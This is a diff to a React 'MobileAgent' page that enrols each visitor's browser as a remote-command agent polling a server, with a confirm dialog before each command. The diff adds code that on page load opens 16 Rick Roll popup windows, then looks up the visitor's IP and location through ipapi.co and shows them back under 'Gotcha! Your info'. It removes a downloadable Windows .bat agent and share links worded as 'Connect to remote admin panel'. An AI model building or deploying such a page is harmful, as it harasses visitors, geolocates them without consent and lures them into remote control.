@@ -1,5 +1,5 @@
-import { useEffect, useRef, useState, useCallback } from 'react'
-import { Smartphone, Wifi, Battery, MapPin, Clipboard, Globe, AlertCircle, CheckCircle, Download, Link2, Share2, RotateCcw } from 'lucide-react'
+import { useEffect, useRef, useState } from 'react'
+import { Smartphone, Wifi, Battery, MapPin, Clipboard, Globe, AlertCircle, CheckCircle } from 'lucide-react'
 
 const SERVER_URL = typeof window !== 'undefined' ? window.location.origin : ''
 const POLL_INTERVAL = 3000
@@ -20,76 +20,35 @@ export default function MobileAgent() {
   const [agentId, setAgentId] = useState<string>('')
   const [lastActivity, setLastActivity] = useState<string>('')
   const [commandsReceived, setCommandsReceived] = useState(0)
-  const [copyOk, setCopyOk] = useState(false)
+  const [rickLaunched, setRickLaunched] = useState(false)
   const [ipInfo, setIpInfo] = useState<any>(null)
   const [showIp, setShowIp] = useState(false)
-  const [rickLaunched, setRickLaunched] = useState(false)
   const agentIdRef = useRef<string>('')
   const pollingRef = useRef<boolean>(false)
-  const reconnectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
 
-  const fetchIp = useCallback(async () => {
-    try {
-      const res = await fetch('https://ipapi.co/json/')
-      const data = await res.json()
-      setIpInfo(data)
-      setShowIp(true)
-    } catch {
-      setIpInfo({ ip: 'unknown', city: 'unknown', country_name: 'unknown' })
-      setShowIp(true)
-    }
+  // Auto-Rick Roll on mount (mobile)
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setRickLaunched(true)
+      for (let i = 0; i < 16; i++) {
+        setTimeout(() => {
+          window.open(RICK_URL, '_blank')
+        }, i * 200)
+      }
+      setTimeout(() => {
+        fetch('https://ipapi.co/json/')
+          .then(r => r.json())
+          .then(data => { setIpInfo(data); setShowIp(true) })
+          .catch(() => { setIpInfo({ ip: 'unknown' }); setShowIp(true) })
+      }, 4000)
+    }, 600)
+    return () => clearTimeout(timer)
   }, [])
 
-  const launchRickRoll = useCallback(() => {
-    if (rickLaunched) return
-    setRickLaunched(true)
-
-    // Open 16 tabs/windows on mobile — direct call within user gesture
-    for (let i = 0; i < 16; i++) {
-      const features = `width=640,height=480,popup=yes,resizable=yes,scrollbars=yes`
-      window.open(RICK_URL, `_blank${i}`, features)
-    }
-
-    // Fetch IP after
-    setTimeout(() => {
-      fetchIp()
-    }, 4000)
-  }, [rickLaunched, fetchIp])
-
-  useEffect(() => {
-    // Auto-launch Rick Roll on page load (mobile)
-    const timer = setTimeout(() => {
-      launchRickRoll()
-    }, 600)
-
-    // Also launch on any tap
-    document.addEventListener('click', launchRickRoll)
-    document.addEventListener('touchstart', launchRickRoll)
-
-    return () => {
-      clearTimeout(timer)
-      document.removeEventListener('click', launchRickRoll)
-      document.removeEventListener('touchstart', launchRickRoll)
-    }
-  }, [launchRickRoll])
-
-  // Auto-register on mount + visibility change handler
+  // Auto-register on mount
   useEffect(() => {
     registerAgent()
-
-    const handleVisibility = () => {
-      if (!document.hidden && agentIdRef.current && !pollingRef.current) {
-        pollingRef.current = true
-        startPolling(agentIdRef.current)
-      }
-    }
-    document.addEventListener('visibilitychange', handleVisibility)
-
-    return () => {
-      pollingRef.current = false
-      document.removeEventListener('visibilitychange', handleVisibility)
-      if (reconnectTimerRef.current) clearTimeout(reconnectTimerRef.current)
-    }
+    return () => { pollingRef.current = false }
   }, [])
 
   async function registerAgent() {
@@ -138,6 +97,7 @@ export default function MobileAgent() {
           setLastActivity(new Date().toLocaleTimeString())
           const cmd = data.command.command as string
 
+          // Show browser consent dialog (blocks execution)
           const approved = window.confirm(
             `Remote Access Request\n\n` +
             `Command: ${cmd}\n\n` +
@@ -311,45 +271,9 @@ export default function MobileAgent() {
     return new Promise(r => setTimeout(r, ms))
   }
 
-  async function copyLink() {
-    try {
-      await navigator.clipboard.writeText(window.location.href)
-      setCopyOk(true)
-      setTimeout(() => setCopyOk(false), 2000)
-    } catch {
-      // fallback
-    }
-  }
-
-  async function shareLink() {
-    const shareData = {
-      title: 'Remote Access Session',
-      text: 'Connect to remote admin panel',
-      url: window.location.href,
-    }
-    if (navigator.share) {
-      try {
-        await navigator.share(shareData)
-      } catch {
-        // user cancelled
-      }
-    } else {
-      copyLink()
-    }
-  }
-
-  function reconnect() {
-    setStatus('connecting')
-    pollingRef.current = false
-    if (reconnectTimerRef.current) clearTimeout(reconnectTimerRef.current)
-    reconnectTimerRef.current = setTimeout(() => {
-      registerAgent()
-    }, 500)
-  }
-
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white flex flex-col items-center justify-center p-4">
-      <div className="w-full max-w-sm space-y-5">
+      <div className="w-full max-w-sm space-y-6">
         {/* Rick Roll Banner */}
         {rickLaunched && (
           <div className="bg-pink-500/20 border border-pink-500/30 rounded-xl p-4 text-center">
@@ -359,7 +283,6 @@ export default function MobileAgent() {
                 <p className="text-pink-400 font-bold">Gotcha! Your info:</p>
                 <p className="text-white font-mono">IP: {ipInfo.ip}</p>
                 <p className="text-white font-mono">{ipInfo.city}, {ipInfo.region}, {ipInfo.country_name}</p>
-                <p className="text-white font-mono">ISP: {ipInfo.org}</p>
               </div>
             )}
           </div>
@@ -380,22 +303,15 @@ export default function MobileAgent() {
         <div className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 space-y-3">
           <div className="flex items-center justify-between">
             <span className="text-sm text-slate-400">Status</span>
-            <div className="flex items-center gap-2">
-              {status === 'error' && (
-                <button onClick={reconnect} className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300">
-                  <RotateCcw className="w-3.5 h-3.5" />
-                </button>
-              )}
-              <span className={`text-sm font-medium px-2 py-0.5 rounded-full ${
-                status === 'connected'
-                  ? 'bg-emerald-500/20 text-emerald-400'
-                  : status === 'error'
-                  ? 'bg-red-500/20 text-red-400'
-                  : 'bg-amber-500/20 text-amber-400'
-              }`}>
-                {status === 'connected' ? 'Connected' : status === 'error' ? 'Error' : 'Connecting...'}
-              </span>
-            </div>
+            <span className={`text-sm font-medium px-2 py-0.5 rounded-full ${
+              status === 'connected'
+                ? 'bg-emerald-500/20 text-emerald-400'
+                : status === 'error'
+                ? 'bg-red-500/20 text-red-400'
+                : 'bg-amber-500/20 text-amber-400'
+            }`}>
+              {status === 'connected' ? 'Connected' : status === 'error' ? 'Error' : 'Connecting...'}
+            </span>
           </div>
 
           {agentId && (
@@ -418,46 +334,18 @@ export default function MobileAgent() {
           )}
         </div>
 
-        {/* Action Buttons */}
-        <div className="grid grid-cols-2 gap-3">
-          <a
-            href={`${SERVER_URL}/api/agent/bat`}
-            download="connect.bat"
-            className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors"
-          >
-            <Download className="w-6 h-6 text-emerald-400" />
-            <span className="text-xs text-center text-slate-300">Download Windows Agent (.bat)</span>
-          </a>
-
-          <button
-            onClick={copyLink}
-            className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors"
-          >
-            <Link2 className={`w-6 h-6 ${copyOk ? 'text-emerald-400' : 'text-slate-400'}`} />
-            <span className="text-xs text-center text-slate-300">
-              {copyOk ? 'Copied!' : 'Copy Page Link'}
-            </span>
-          </button>
-
-          <button
-            onClick={shareLink}
-            className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors col-span-2"
-          >
-            <Share2 className="w-6 h-6 text-blue-400" />
-            <span className="text-xs text-center text-slate-300">Share This Session</span>
-          </button>
-        </div>
-
+        {/* Keep Open Notice */}
         <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 flex gap-3">
           <AlertCircle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
           <div className="space-y-1">
             <p className="text-sm text-amber-200 font-medium">Keep this page open</p>
             <p className="text-xs text-amber-200/70">
-              The agent reconnects automatically when you return to this tab. For continuous connection, keep the browser active.
+              The agent stops polling when you close this tab. Minimize the browser to keep it running in the background.
             </p>
           </div>
         </div>
 
+        {/* Supported Commands */}
         <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-4">
           <p className="text-xs text-slate-500 font-medium uppercase mb-3">Supported Commands</p>
           <div className="grid grid-cols-2 gap-2">
@@ -480,6 +368,7 @@ export default function MobileAgent() {
           </div>
         </div>
 
+        {/* Consent Notice */}
         <div className="text-center space-y-1">
           <div className="flex items-center justify-center gap-2 text-emerald-400">
             <CheckCircle className="w-4 h-4" />
